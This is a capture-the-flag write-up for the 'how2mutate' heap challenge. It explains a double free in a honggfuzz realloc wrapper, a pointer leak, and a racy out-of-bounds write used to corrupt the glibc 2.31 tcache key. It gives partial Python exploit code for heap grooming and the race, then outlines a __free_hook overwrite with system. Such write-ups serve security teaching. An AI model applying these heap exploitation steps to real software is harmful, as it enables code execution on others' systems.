# how2mutate


This challenge lets us allocate seeds, optionally mutate them with controlled mutation iterations, free, print and *fuzz* seeds.

Right away let's check add_seed function:
```cpp
void add_seed() {
    int i=0;
    while (i<10 && seeds[i]) i++;
    if (i<10) {
        printf("size: ");
        scanf("%d", &seedssz[i]);
        int sz = seedssz[i]+1;
        if (sz>0 && sz<0x8000) {
            printf("content: ");
            seeds[i] = util_Calloc(sz);
            read(0, seeds[i], seedssz[i]);
        }
    }
}
```
The important part is that size of zero is allowed. The allocation will be of `provided size + 1` but the size recorded in `seedssz` will be the original size.

Now, seed mutation:

```cpp
void mutate_seed() {
    char buf[16];
    printf("index: ");
    read(0, buf, 4);
    if (buf[0]>='0' && buf[0]<='9') {
        int idx = buf[0]-'0';
        if (seeds[idx]) {
            run.dynfile->size = seedssz[idx];
            memcpy(run.dynfile->data, seeds[idx], seedssz[idx]);
            mangle_mangleContent(&run, 1);
            seedssz[idx] = run.dynfile->size;
            seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);
            memcpy(seeds[idx], run.dynfile->data, seedssz[idx]);
        }
    }
}
```

It passes original size to `realloc`, effectively truncating the allocated chunk to originally provided size. Libc realloc would free the chunk here but what happens in `util_Realloc`?

So the base bug is mishandling the result of `realloc` in  `util_Realloc` wrapper. `realloc` of size zero frees the pointer and return zero, however honggfuzz implementation treats it as an error (and prints the pointer!!!) and frees the original pointer once again:

```cpp
// @ libhfcommon/util.c

void* util_Realloc(void* ptr, size_t sz) {
    void* ret = realloc(ptr, sz); // < free once if size is zero
    if (ret == NULL) {
        PLOG_W("realloc(%p, %zu)", ptr, sz); // free leak :D
        free(ptr); // < free second time if realloc returned null
        return NULL;
    }
    return ret;
}
```


Even though it returns null which effectively marks the seed as freed in the global seeds array, memcpy later won't trigger a crash since the size of copy is zero.


Now how would that be exploited on libc 2.31? The issue is that there're tcache key checks which are performed before it is even decided if the chunk goes to tcache or fastbins - this means that it's not possible to split the same chunk into tcache and fastbin without modifying the tcache key value.

```cpp
    if (__glibc_unlikely (e->key == tcache))
      {
        tcache_entry *tmp;
        size_t cnt = 0;
        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
        for (tmp = tcache->entries[tc_idx];
         tmp;
         tmp = REVEAL_PTR (tmp->next), ++cnt)
          {
        if (tmp == e)
          malloc_printerr ("free(): double free detected in tcache 2");
        /* If we get here, it was a coincidence.  We've wasted a
           few cycles, but don't abort.  */
          }
      }

    if (tcache->counts[tc_idx] < mp_.tcache_count) // < this is performed after tcache key checks :(
      {
        tcache_put (p, tc_idx);
        return;
      }
```

This issue can be solved with a second bug in seed fuzzing mechanism which runs on a separate thread and processes our contents.

The relevant snippet:
```cpp
int fuzzone(char* buf) {
    //
    if (buf[0] == '0') {
        bool ok=true;
        for (i=2; i<15; i++) {
            buf[i] -= buf[i-1];
            if (buf[i] != buf[i+1])
                ok = false;
        }
        if (ok)
            puts("path 9");
    }
    return 0;
```

The buf is controlled seed contents. It will iterate from indexes 2 and up to index 15 and modify the contents without doing any bounds checks. This is how we corrupt tcache key.

In order to hit this part successfully it has to be executed after first free but before second free. Since we dont directly control the buf contents after first free we have to do some heap grooming so that the LSB of forward pointer inside freed chunk would be equal to ascii `0`. Then it will walk over tcache key while modifying it.

```py
MODE=DONT_WAIT

set_mutate(0)

for i in range(6):
    delete_seed(i)

add_seed("")
mutate_seed(0)


r.recvuntil("realloc(")
tmp = r.recvuntil(",")[2:-1]
print tmp
if len(tmp) % 2:
    tmp += "0"

heap = u64(binascii.unhexlify(tmp)[::-1].ljust(8,"\x00"))
log.info("heap @ " +hex(heap))

#MODE = DONT_WAIT


for i in range(4):
    add_seed("T" * 8)

add_seed("X" * (0xe0 + 0x20 + offset)) # padding
add_seed("A"*8) # fd = "0"


add_seed("") # victim @ 6

for i in range(4):
    delete_seed(i)

delete_seed(5) # delete prev chunk

```

After heap is groomed we start the race


```py
MODE = BUFFERING

spawn_fuzzer_thread()


sleep(sleep_time)
mutate_seed(6)


print("sleep!!!!")
sleep(0.1)

# buffer flushing later
```

If race was successful we get double free inside tcache. 
From there: 
* we get a pointer on top of seeds array
* inject pointers to fake seeds to leak libc
* inject pointer to dynfile structure
* free dynfile structure while attempting to reclaim it (see fun facts)
* if reclaimed succesfully `dynfile->data` pointed to free hook
* seed mutation would do a copy to dynfile data, so we use that to copy system ptr to free hook
* ???
* sice



Fun fact #1, since the challenge was hosted far away from me (probably in China) it was **not** possible to hit the race with synchronized IO so i had to do buffered IO

Fun fact #2, heap state on remote was different from heap state locally so i had to do a lot of arbitrary writes in order to get good state on remote.

Fun fact #3, sending input larger than **0x800** bytes on remote would kill the connection, not sure if it actually crashed but it broke some of my strategies and made the exploit unreliable in some places (e.g dynfile structure reclaiming)
